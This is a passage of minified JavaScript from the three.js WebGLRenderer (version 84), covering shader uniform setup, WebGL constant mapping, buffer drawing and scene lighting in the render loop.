0===d?g.material:d,g=g.group;h.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,h.matrixWorld);h.normalMatrix.getNormalMatrix(h.modelViewMatrix);h.onBeforeRender(P,b,c,m,k,g);if(h.isImmediateRenderObject){l(k);var n=G(c,b.fog,k,h);V=\"\";h.render(function(a){P.renderBufferImmediate(a,n,k)})}else P.renderBufferDirect(c,b.fog,m,k,h,g);h.onAfterRender(P,b,c,m,k,g)}}function l(a){2===a.side?Y.disable(B.CULL_FACE):Y.enable(B.CULL_FACE);\nY.setFlipSided(1===a.side);!0===a.transparent?Y.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,a.blendSrcAlpha,a.blendDstAlpha,a.premultipliedAlpha):Y.setBlending(0);Y.setDepthFunc(a.depthFunc);Y.setDepthTest(a.depthTest);Y.setDepthWrite(a.depthWrite);Y.setColorWrite(a.colorWrite);Y.setPolygonOffset(a.polygonOffset,a.polygonOffsetFactor,a.polygonOffsetUnits)}function G(a,b,c,d){ea=0;var g=ha.get(c);oa&&(ra||a!==U)&&ca.setState(c.clippingPlanes,c.clipIntersection,\nc.clipShadows,a,g,a===U&&c.id===R);!1===c.needsUpdate&&(void 0===g.program?c.needsUpdate=!0:c.fog&&g.fog!==b?c.needsUpdate=!0:c.lights&&g.lightsHash!==ba.hash?c.needsUpdate=!0:void 0===g.numClippingPlanes||g.numClippingPlanes===ca.numPlanes&&g.numIntersection===ca.numIntersection||(c.needsUpdate=!0));if(c.needsUpdate){a:{var h=ha.get(c),m=ya.getParameters(c,ba,b,ca.numPlanes,ca.numIntersection,d),k=ya.getProgramCode(c,m),n=h.program,t=!0;if(void 0===n)c.addEventListener(\"dispose\",e);else if(n.code!==\nk)f(c);else if(void 0!==m.shaderID)break a;else t=!1;t&&(m.shaderID?(n=bb[m.shaderID],h.__webglShader={name:c.type,uniforms:Ja.clone(n.uniforms),vertexShader:n.vertexShader,fragmentShader:n.fragmentShader}):h.__webglShader={name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,n=ya.acquireProgram(c,m,k),h.program=n,c.program=n);m=n.getAttributes();if(c.morphTargets)for(k=c.numSupportedMorphTargets=0;k<P.maxMorphTargets;k++)0<=\nm[\"morphTarget\"+k]&&c.numSupportedMorphTargets++;if(c.morphNormals)for(k=c.numSupportedMorphNormals=0;k<P.maxMorphNormals;k++)0<=m[\"morphNormal\"+k]&&c.numSupportedMorphNormals++;m=h.__webglShader.uniforms;if(!c.isShaderMaterial&&!c.isRawShaderMaterial||!0===c.clipping)h.numClippingPlanes=ca.numPlanes,h.numIntersection=ca.numIntersection,m.clippingPlanes=ca.uniform;h.fog=b;h.lightsHash=ba.hash;c.lights&&(m.ambientLightColor.value=ba.ambient,m.directionalLights.value=ba.directional,m.spotLights.value=\nba.spot,m.rectAreaLights.value=ba.rectArea,m.pointLights.value=ba.point,m.hemisphereLights.value=ba.hemi,m.directionalShadowMap.value=ba.directionalShadowMap,m.directionalShadowMatrix.value=ba.directionalShadowMatrix,m.spotShadowMap.value=ba.spotShadowMap,m.spotShadowMatrix.value=ba.spotShadowMatrix,m.pointShadowMap.value=ba.pointShadowMap,m.pointShadowMatrix.value=ba.pointShadowMatrix);k=h.program.getUniforms();m=$a.seqWithValue(k.seq,m);h.uniformsList=m}c.needsUpdate=!1}var p=!1,t=n=!1,h=g.program,\nm=h.getUniforms(),k=g.__webglShader.uniforms;h.id!==wa&&(B.useProgram(h.program),wa=h.id,t=n=p=!0);c.id!==R&&(R=c.id,n=!0);if(p||a!==U){m.set(B,a,\"projectionMatrix\");la.logarithmicDepthBuffer&&m.setValue(B,\"logDepthBufFC\",2/(Math.log(a.far+1)/Math.LN2));a!==U&&(U=a,t=n=!0);if(c.isShaderMaterial||c.isMeshPhongMaterial||c.isMeshStandardMaterial||c.envMap)p=m.map.cameraPosition,void 0!==p&&p.setValue(B,Ga.setFromMatrixPosition(a.matrixWorld));(c.isMeshPhongMaterial||c.isMeshLambertMaterial||c.isMeshBasicMaterial||\nc.isMeshStandardMaterial||c.isShaderMaterial||c.skinning)&&m.setValue(B,\"viewMatrix\",a.matrixWorldInverse);m.set(B,P,\"toneMappingExposure\");m.set(B,P,\"toneMappingWhitePoint\")}c.skinning&&(m.setOptional(B,d,\"bindMatrix\"),m.setOptional(B,d,\"bindMatrixInverse\"),a=d.skeleton)&&(la.floatVertexTextures&&a.useVertexTexture?(m.set(B,a,\"boneTexture\"),m.set(B,a,\"boneTextureWidth\"),m.set(B,a,\"boneTextureHeight\")):m.setOptional(B,a,\"boneMatrices\"));if(n){c.lights&&(a=t,k.ambientLightColor.needsUpdate=a,k.directionalLights.needsUpdate=\na,k.pointLights.needsUpdate=a,k.spotLights.needsUpdate=a,k.rectAreaLights.needsUpdate=a,k.hemisphereLights.needsUpdate=a);b&&c.fog&&(k.fogColor.value=b.color,b.isFog?(k.fogNear.value=b.near,k.fogFar.value=b.far):b.isFogExp2&&(k.fogDensity.value=b.density));if(c.isMeshBasicMaterial||c.isMeshLambertMaterial||c.isMeshPhongMaterial||c.isMeshStandardMaterial||c.isMeshNormalMaterial||c.isMeshDepthMaterial){k.opacity.value=c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);\nk.map.value=c.map;k.specularMap.value=c.specularMap;k.alphaMap.value=c.alphaMap;c.lightMap&&(k.lightMap.value=c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity);c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var l;c.map?l=c.map:c.specularMap?l=c.specularMap:c.displacementMap?l=c.displacementMap:c.normalMap?l=c.normalMap:c.bumpMap?l=c.bumpMap:c.roughnessMap?l=c.roughnessMap:c.metalnessMap?l=c.metalnessMap:c.alphaMap?l=c.alphaMap:c.emissiveMap&&(l=c.emissiveMap);void 0!==\nl&&(l.isWebGLRenderTarget&&(l=l.texture),b=l.offset,l=l.repeat,k.offsetRepeat.value.set(b.x,b.y,l.x,l.y));k.envMap.value=c.envMap;k.flipEnvMap.value=c.envMap&&c.envMap.isCubeTexture?-1:1;k.reflectivity.value=c.reflectivity;k.refractionRatio.value=c.refractionRatio}c.isLineBasicMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity):c.isLineDashedMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):\nc.isPointsMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.size.value=c.size*Ra,k.scale.value=.5*Cc,k.map.value=c.map,null!==c.map&&(l=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(l.x,l.y,c.x,c.y))):c.isMeshLambertMaterial?c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap):c.isMeshToonMaterial?(r(k,c),c.gradientMap&&(k.gradientMap.value=c.gradientMap)):c.isMeshPhongMaterial?r(k,c):c.isMeshPhysicalMaterial?(k.clearCoat.value=c.clearCoat,k.clearCoatRoughness.value=c.clearCoatRoughness,\nA(k,c)):c.isMeshStandardMaterial?A(k,c):c.isMeshDepthMaterial?c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c.isMeshNormalMaterial&&(c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,\nk.displacementBias.value=c.displacementBias));void 0!==k.ltcMat&&(k.ltcMat.value=THREE.UniformsLib.LTC_MAT_TEXTURE);void 0!==k.ltcMag&&(k.ltcMag.value=THREE.UniformsLib.LTC_MAG_TEXTURE);$a.upload(B,g.uniformsList,k,P)}m.set(B,d,\"modelViewMatrix\");m.set(B,d,\"normalMatrix\");m.setValue(B,\"modelMatrix\",d.matrixWorld);return h}function r(a,b){a.specular.value=b.specular;a.shininess.value=Math.max(b.shininess,1E-4);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,\na.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=b.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias)}function A(a,b){a.roughness.value=b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);\nb.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=b.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function w(a){var b;if(1E3===a)return B.REPEAT;if(1001===a)return B.CLAMP_TO_EDGE;if(1002===a)return B.MIRRORED_REPEAT;if(1003===a)return B.NEAREST;\nif(1004===a)return B.NEAREST_MIPMAP_NEAREST;if(1005===a)return B.NEAREST_MIPMAP_LINEAR;if(1006===a)return B.LINEAR;if(1007===a)return B.LINEAR_MIPMAP_NEAREST;if(1008===a)return B.LINEAR_MIPMAP_LINEAR;if(1009===a)return B.UNSIGNED_BYTE;if(1017===a)return B.UNSIGNED_SHORT_4_4_4_4;if(1018===a)return B.UNSIGNED_SHORT_5_5_5_1;if(1019===a)return B.UNSIGNED_SHORT_5_6_5;if(1010===a)return B.BYTE;if(1011===a)return B.SHORT;if(1012===a)return B.UNSIGNED_SHORT;if(1013===a)return B.INT;if(1014===a)return B.UNSIGNED_INT;\nif(1015===a)return B.FLOAT;if(1016===a&&(b=ja.get(\"OES_texture_half_float\"),null!==b))return b.HALF_FLOAT_OES;if(1021===a)return B.ALPHA;if(1022===a)return B.RGB;if(1023===a)return B.RGBA;if(1024===a)return B.LUMINANCE;if(1025===a)return B.LUMINANCE_ALPHA;if(1026===a)return B.DEPTH_COMPONENT;if(1027===a)return B.DEPTH_STENCIL;if(100===a)return B.FUNC_ADD;if(101===a)return B.FUNC_SUBTRACT;if(102===a)return B.FUNC_REVERSE_SUBTRACT;if(200===a)return B.ZERO;if(201===a)return B.ONE;if(202===a)return B.SRC_COLOR;\nif(203===a)return B.ONE_MINUS_SRC_COLOR;if(204===a)return B.SRC_ALPHA;if(205===a)return B.ONE_MINUS_SRC_ALPHA;if(206===a)return B.DST_ALPHA;if(207===a)return B.ONE_MINUS_DST_ALPHA;if(208===a)return B.DST_COLOR;if(209===a)return B.ONE_MINUS_DST_COLOR;if(210===a)return B.SRC_ALPHA_SATURATE;if(2001===a||2002===a||2003===a||2004===a)if(b=ja.get(\"WEBGL_compressed_texture_s3tc\"),null!==b){if(2001===a)return b.COMPRESSED_RGB_S3TC_DXT1_EXT;if(2002===a)return b.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(2003===a)return b.COMPRESSED_RGBA_S3TC_DXT3_EXT;\nif(2004===a)return b.COMPRESSED_RGBA_S3TC_DXT5_EXT}if(2100===a||2101===a||2102===a||2103===a)if(b=ja.get(\"WEBGL_compressed_texture_pvrtc\"),null!==b){if(2100===a)return b.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(2101===a)return b.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(2102===a)return b.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(2103===a)return b.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(2151===a&&(b=ja.get(\"WEBGL_compressed_texture_etc1\"),null!==b))return b.COMPRESSED_RGB_ETC1_WEBGL;if(103===a||104===a)if(b=ja.get(\"EXT_blend_minmax\"),\nnull!==b){if(103===a)return b.MIN_EXT;if(104===a)return b.MAX_EXT}return 1020===a&&(b=ja.get(\"WEBGL_depth_texture\"),null!==b)?b.UNSIGNED_INT_24_8_WEBGL:0}console.log(\"THREE.WebGLRenderer\",\"84\");a=a||{};var y=void 0!==a.canvas?a.canvas:document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),K=void 0!==a.context?a.context:null,v=void 0!==a.alpha?a.alpha:!1,E=void 0!==a.depth?a.depth:!0,L=void 0!==a.stencil?a.stencil:!0,C=void 0!==a.antialias?a.antialias:!1,F=void 0!==a.premultipliedAlpha?\na.premultipliedAlpha:!0,x=void 0!==a.preserveDrawingBuffer?a.preserveDrawingBuffer:!1,H=[],aa=[],D=-1,z=[],T=-1,Q=new Float32Array(8),M=[],O=[];this.domElement=y;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=!1;this.toneMappingWhitePoint=this.toneMappingExposure=this.toneMapping=1;this.maxMorphTargets=\n8;this.maxMorphNormals=4;var P=this,wa=null,W=null,N=null,R=-1,V=\"\",U=null,X=new fa,Sa=null,Z=new fa,ea=0,Ea=new J(0),gb=0,md=y.width,Cc=y.height,Ra=1,ga=new fa(0,0,md,Cc),ka=!1,ia=new fa(0,0,md,Cc),ma=new tc,ca=new Uf,oa=!1,ra=!1,na=new Na,ua=new S,Ga=new q,Ba=new S,xa=new S,ba={hash:\"\",ambient:[0,0,0],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],shadows:[]},pa={calls:0,\nvertices:0,faces:0,points:0};this.info={render:pa,memory:{geometries:0,textures:0},programs:null};var B;try{v={alpha:v,depth:E,stencil:L,antialias:C,premultipliedAlpha:F,preserveDrawingBuffer:x};B=K||y.getContext(\"webgl\",v)||y.getContext(\"experimental-webgl\",v);if(null===B){if(null!==y.getContext(\"webgl\"))throw\"Error creating WebGL context with your selected attributes.\";throw\"Error creating WebGL context.\";}void 0===B.getShaderPrecisionFormat&&(B.getShaderPrecisionFormat=function(){return{rangeMin:1,\nrangeMax:1,precision:1}});y.addEventListener(\"webglcontextlost\",d,!1)}catch(Vf){console.error(\"THREE.WebGLRenderer: \"+Vf)}var ja=new Tf(B);ja.get(\"WEBGL_depth_texture\");ja.get(\"OES_texture_float\");ja.get(\"OES_texture_float_linear\");ja.get(\"OES_texture_half_float\");ja.get(\"OES_texture_half_float_linear\");ja.get(\"OES_standard_derivatives\");ja.get(\"ANGLE_instanced_arrays\");ja.get(\"OES_element_index_uint\")&&(I.MaxIndex=4294967296);var la=new Sf(B,ja,a),Y=new Rf(B,ja,w),ha=new Qf,ta=new Pf(B,ja,Y,ha,la,\nw,this.info),qa=new Of(B,ha,this.info),ya=new Mf(this,la),za=new Ef;this.info.programs=ya.programs;var La=new Df(B,ja,pa),Oa=new Cf(B,ja,pa),Ia,Ca,sa,va;b();this.context=B;this.capabilities=la;this.extensions=ja;this.properties=ha;this.state=Y;var Ma=new Ke(this,ba,qa,la);this.shadowMap=Ma;var Pa=new zf(this,M),Qa=new yf(this,O);this.getContext=function(){return B};this.getContextAttributes=function(){return B.getContextAttributes()};this.forceContextLoss=function(){ja.get(\"WEBGL_lose_context\").loseContext()};\nthis.getMaxAnisotropy=function(){return la.getMaxAnisotropy()};this.getPrecision=function(){return la.precision};this.getPixelRatio=function(){return Ra};this.setPixelRatio=function(a){void 0!==a&&(Ra=a,this.setSize(ia.z,ia.w,!1))};this.getSize=function(){return{width:md,height:Cc}};this.setSize=function(a,b,c){md=a;Cc=b;y.width=a*Ra;y.height=b*Ra;!1!==c&&(y.style.width=a+\"px\",y.style.height=b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){Y.viewport(ia.set(a,b,c,d))};this.setScissor=\nfunction(a,b,c,d){Y.scissor(ga.set(a,b,c,d))};this.setScissorTest=function(a){Y.setScissorTest(ka=a)};this.getClearColor=function(){return Ea};this.setClearColor=function(a,b){Ea.set(a);gb=void 0!==b?b:1;Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)};this.getClearAlpha=function(){return gb};this.setClearAlpha=function(a){gb=a;Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)};this.clear=function(a,b,c){var d=0;if(void 0===a||a)d|=B.COLOR_BUFFER_BIT;if(void 0===b||b)d|=B.DEPTH_BUFFER_BIT;if(void 0===c||\nc)d|=B.STENCIL_BUFFER_BIT;B.clear(d)};this.clearColor=function(){this.clear(!0,!1,!1)};this.clearDepth=function(){this.clear(!1,!0,!1)};this.clearStencil=function(){this.clear(!1,!1,!0)};this.clearTarget=function(a,b,c,d){this.setRenderTarget(a);this.clear(b,c,d)};this.resetGLState=c;this.dispose=function(){z=[];T=-1;aa=[];D=-1;y.removeEventListener(\"webglcontextlost\",d,!1)};this.renderBufferImmediate=function(a,b,c){Y.initAttributes();var d=ha.get(a);a.hasPositions&&!d.position&&(d.position=B.createBuffer());\na.hasNormals&&!d.normal&&(d.normal=B.createBuffer());a.hasUvs&&!d.uv&&(d.uv=B.createBuffer());a.hasColors&&!d.color&&(d.color=B.createBuffer());b=b.getAttributes();a.hasPositions&&(B.bindBuffer(B.ARRAY_BUFFER,d.position),B.bufferData(B.ARRAY_BUFFER,a.positionArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.position),B.vertexAttribPointer(b.position,3,B.FLOAT,!1,0,0));if(a.hasNormals){B.bindBuffer(B.ARRAY_BUFFER,d.normal);if(!c.isMeshPhongMaterial&&!c.isMeshStandardMaterial&&!c.isMeshNormalMaterial&&1===\nc.shading)for(var e=0,f=3*a.count;e<f;e+=9){var g=a.normalArray,h=(g[e+0]+g[e+3]+g[e+6])/3,m=(g[e+1]+g[e+4]+g[e+7])/3,k=(g[e+2]+g[e+5]+g[e+8])/3;g[e+0]=h;g[e+1]=m;g[e+2]=k;g[e+3]=h;g[e+4]=m;g[e+5]=k;g[e+6]=h;g[e+7]=m;g[e+8]=k}B.bufferData(B.ARRAY_BUFFER,a.normalArray,B.DYNAMIC_DRAW);Y.enableAttribute(b.normal);B.vertexAttribPointer(b.normal,3,B.FLOAT,!1,0,0)}a.hasUvs&&c.map&&(B.bindBuffer(B.ARRAY_BUFFER,d.uv),B.bufferData(B.ARRAY_BUFFER,a.uvArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.uv),B.vertexAttribPointer(b.uv,\n2,B.FLOAT,!1,0,0));a.hasColors&&0!==c.vertexColors&&(B.bindBuffer(B.ARRAY_BUFFER,d.color),B.bufferData(B.ARRAY_BUFFER,a.colorArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.color),B.vertexAttribPointer(b.color,3,B.FLOAT,!1,0,0));Y.disableUnusedAttributes();B.drawArrays(B.TRIANGLES,0,a.count);a.count=0};this.renderBufferDirect=function(a,b,c,d,e,f){l(d);var h=G(a,b,d,e),m=!1;a=c.id+\"_\"+h.id+\"_\"+d.wireframe;a!==V&&(V=a,m=!0);b=e.morphTargetInfluences;if(void 0!==b){var k=[];a=0;for(var n=b.length;a<n;a++)m=\nb[a],k.push([m,a]);k.sort(g);8<k.length&&(k.length=8);var t=c.morphAttributes;a=0;for(n=k.length;a<n;a++)m=k[a],Q[a]=m[0],0!==m[0]?(b=m[1],!0===d.morphTargets&&t.position&&c.addAttribute(\"morphTarget\"+a,t.position[b]),!0===d.morphNormals&&t.normal&&c.addAttribute(\"morphNormal\"+a,t.normal[b])):(!0===d.morphTargets&&c.removeAttribute(\"morphTarget\"+a),!0===d.morphNormals&&c.removeAttribute(\"morphNormal\"+a));a=k.length;for(b=Q.length;a<b;a++)Q[a]=0;h.getUniforms().setValue(B,\"morphTargetInfluences\",Q);\nm=!0}b=c.index;n=c.attributes.position;k=1;!0===d.wireframe&&(b=qa.getWireframeAttribute(c),k=2);null!==b?(a=Oa,a.setIndex(b)):a=La;if(m){a:{var m=void 0,p;if(c&&c.isInstancedBufferGeometry&&(p=ja.get(\"ANGLE_instanced_arrays\"),null===p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");break a}void 0===m&&(m=0);Y.initAttributes();var t=c.attributes,h=h.getAttributes(),r=d.defaultAttributeValues,\nq;for(q in h){var y=h[q];if(0<=y){var v=t[q];if(void 0!==v){var w=v.normalized,A=v.itemSize,K=qa.getAttributeProperties(v),C=K.__webglBuffer,L=K.type,K=K.bytesPerElement;if(v.isInterleavedBufferAttribute){var F=v.data,E=F.stride,v=v.offset;F&&F.isInstancedInterleavedBuffer?(Y.enableAttributeAndDivisor(y,F.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=F.meshPerAttribute*F.count)):Y.enableAttribute(y);B.bindBuffer(B.ARRAY_BUFFER,C);B.vertexAttribPointer(y,A,L,w,E*K,(m*E+v)*\nK)}else v.isInstancedBufferAttribute?(Y.enableAttributeAndDivisor(y,v.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=v.meshPerAttribute*v.count)):Y.enableAttribute(y),B.bindBuffer(B.ARRAY_BUFFER,C),B.vertexAttribPointer(y,A,L,w,0,m*A*K)}else if(void 0!==r&&(w=r[q],void 0!==w))switch(w.length){case 2:B.vertexAttrib2fv(y,w);break;case 3:B.vertexAttrib3fv(y,w);break;case 4:B.vertexAttrib4fv(y,w);break;default:B.vertexAttrib1fv(y,w)}}}Y.disableUnusedAttributes()}null!==b&&B.bindBuffer(B.ELEMENT_ARRAY_BUFFER,\nqa.getAttributeBuffer(b))}p=0;null!==b?p=b.count:void 0!==n&&(p=n.count);b=c.drawRange.start*k;n=null!==f?f.start*k:0;q=Math.max(b,n);f=Math.max(0,Math.min(p,b+c.drawRange.count*k,n+(null!==f?f.count*k:Infinity))-1-q+1);if(0!==f){if(e.isMesh)if(!0===d.wireframe)Y.setLineWidth(d.wireframeLinewidth*(null===W?Ra:1)),a.setMode(B.LINES);else switch(e.drawMode){case 0:a.setMode(B.TRIANGLES);break;case 1:a.setMode(B.TRIANGLE_STRIP);break;case 2:a.setMode(B.TRIANGLE_FAN)}else e.isLine?(d=d.linewidth,void 0===\nd&&(d=1),Y.setLineWidth(d*(null===W?Ra:1)),e.isLineSegments?a.setMode(B.LINES):a.setMode(B.LINE_STRIP)):e.isPoints&&a.setMode(B.POINTS);c&&c.isInstancedBufferGeometry?0<c.maxInstancedCount&&a.renderInstances(c,q,f):a.render(q,f)}};this.render=function(a,b,c,d){if(void 0!==b&&!0!==b.isCamera)console.error(\"THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.\");else{V=\"\";R=-1;U=null;!0===a.autoUpdate&&a.updateMatrixWorld();null===b.parent&&b.updateMatrixWorld();b.matrixWorldInverse.getInverse(b.matrixWorld);\nua.multiplyMatrices(b.projectionMatrix,b.matrixWorldInverse);ma.setFromMatrix(ua);H.length=0;T=D=-1;M.length=0;O.length=0;ra=this.localClippingEnabled;oa=ca.init(this.clippingPlanes,ra,b);p(a,b);aa.length=D+1;z.length=T+1;!0===P.sortObjects&&(aa.sort(h),z.sort(m));oa&&ca.beginShadows();for(var e=H,f=0,g=0,k=e.length;g<k;g++){var t=e[g];t.castShadow&&(ba.shadows[f++]=t)}ba.shadows.length=f;Ma.render(a,b);for(var e=H,l=t=0,u=0,r,G,q,y,v=b.matrixWorldInverse,w=0,A=0,K=0,C=0,L=0,f=0,g=e.length;f<g;f++)if(k=\ne[f],r=k.color,G=k.intensity,q=k.distance,y=k.shadow&&k.shadow.map?k.shadow.map.texture:null,k.isAmbientLight)t+=r.r*G,l+=r.g*G,u+=r.b*G;else if(k.isDirectionalLight){var E=za.get(k);E.color.copy(k.color).multiplyScalar(k.intensity);E.direction.setFromMatrixPosition(k.matrixWorld);Ga.setFromMatrixPosition(k.target.matrixWorld);E.direction.sub(Ga);E.direction.transformDirection(v);if(E.shadow=k.castShadow)E.shadowBias=k.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.directionalShadowMap[w]=\ny;ba.directionalShadowMatrix[w]=k.shadow.matrix;ba.directional[w++]=E}else if(k.isSpotLight){E=za.get(k);E.position.setFromMatrixPosition(k.matrixWorld);E.position.applyMatrix4(v);E.color.copy(r).multiplyScalar(G);E.distance=q;E.direction.setFromMatrixPosition(k.matrixWorld);Ga.setFromMatrixPosition(k.target.matrixWorld);E.direction.sub(Ga);E.direction.transformDirection(v);E.coneCos=Math.cos(k.angle);E.penumbraCos=Math.cos(k.angle*(1-k.penumbra));E.decay=0===k.distance?0:k.decay;if(E.shadow=k.castShadow)E.shadowBias=\nk.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.spotShadowMap[K]=y;ba.spotShadowMatrix[K]=k.shadow.matrix;ba.spot[K++]=E}else if(k.isRectAreaLight)E=za.get(k),E.color.copy(r).multiplyScalar(G/(k.width*k.height)),E.position.setFromMatrixPosition(k.matrixWorld),E.position.applyMatrix4(v),xa.identity(),Ba.copy(k.matrixWorld),Ba.premultiply(v),xa.extractRotation(Ba),E.halfWidth.set(.5*k.width,0,0),E.halfHeight.set(0,.5*k.height,0),E.halfWidth.applyMatrix4(xa),E.halfHeight.applyMatrix4(xa),\nba.rectArea[C++]=E;else if(k.isPointLight){E=za.get(k);E.position.setFromMatrixPosition(k.matrixWorld);E.position.applyMatrix4(v);E.color.copy(k.color).multiplyScalar(k.intensity);E.distance=k.distance;E.decay=0===k.distance?0:k.decay;if(E.shadow=k.castShadow)E.shadowBias=k.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.pointShadowMap[A]=y;void 0===ba.pointShadowMatrix[A]&&(ba.pointShadowMatrix[A]=new S);Ga.setFromMatrixPosition(k.matrixWorld).negate();ba.pointShadowMatrix[A].identity().setPosition(Ga);\nba.point[A++]=E}else k.isHemisphereLight&&(E=za.get(k),E.direction.setFromMatrixPosition(k.matrixWorld),E.direction.transformDirection(v),E.direction.normalize(),E.skyColor.copy(k.color).multiplyScalar(G),E.groundColor.copy(k.groundColor).multiplyScalar(G),ba.hemi[L++]=E);ba.ambient[0]=t;ba.ambient[1]=l;ba.ambient[2]=u;ba.directional.length=w;ba.spot.length=K;ba.rectArea.length=C;ba.point.length=A;ba.hemi.length=L;ba.hash=w+\",\"+A+\",\"+K+\",\"+C+\",\"+L+\",\"+ba.shadows.length;oa&&ca.endShadows();pa.calls=\n0;pa.vertices=0;pa.faces=0;pa.points=0;void 0===c&&(c=null);this.setRenderTarget(c);e=a.background;null===e?Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F):e&&e.isColor&&(Y.buffers.color.setClear(e.r,e.g,e.b,1,F),d=!0);(this.autoClear||d)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);e&&e.isCubeTexture?(void 0===sa&&(sa=new Fa,va=new Aa(new kb(5,5,5),new Ha({uniforms:bb.cube.uniforms,vertexShader:bb.cube.vertexShader,fragmentShader:bb.cube.fragmentShader,side:1,depthTest:!1,\ndepthWrite:!1,fog:!1}))),sa.projectionMatrix.copy(b.projectionMatrix),sa.matrixWorld.extractRotation(b.matrixWorld),sa.matrixWorldInverse.getInverse(sa.matrixWorld),va.material.uniforms.tCube.value=e,va.modelViewMatrix.multiplyMatrices(sa.matrixWorldInverse,va.matrixWorld),qa.update(va),P.renderBufferDirect(sa,null,va.geometry,va.material,va,null)):e&&e.isTexture&&(void 0===Ia&&(Ia=new Jb(-1,1,1,-1,0,1),Ca=new Aa(new lb(2,2),new Ka({depthTest:!1,depthWrite:!1,fog:!1}))),Ca.material.map=e,qa.update(Ca),\nP.renderBufferDirect(Ia,null,Ca.geometry,Ca.material,Ca,null));a.overrideMaterial?(d=a.overrideMaterial,n(aa,a,b,d),n(z,a,b,d)):(Y.setBlending(0),n(aa,a,b),n(z,a,b));Pa.render(a,b);Qa.render(a,b,Z);c&&ta.updateRenderTargetMipmap(c);Y.setDepthTest(!0);Y.setDepthWrite(!0);Y.setColorWrite(!0)}};this.setFaceCulling=function(a,b){Y.setCullFace(a);Y.setFlipSided(0===b)};this.allocTextureUnit=function(){var a=ea;a>=la.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nla.maxTextures);ea+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b&&b.isWebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ta.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ta.setTexture2D(b,c)}}();this.setTextureCube=function(){var a=\n!1;return function(b,c){b&&b.isWebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b&&b.isCubeTexture||Array.isArray(b.image)&&6===b.image.length?ta.setTextureCube(b,c):ta.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return W};this.setRenderTarget=function(a){(W=a)&&void 0===ha.get(a).__webglFramebuffer&&ta.setupRenderTarget(a);var 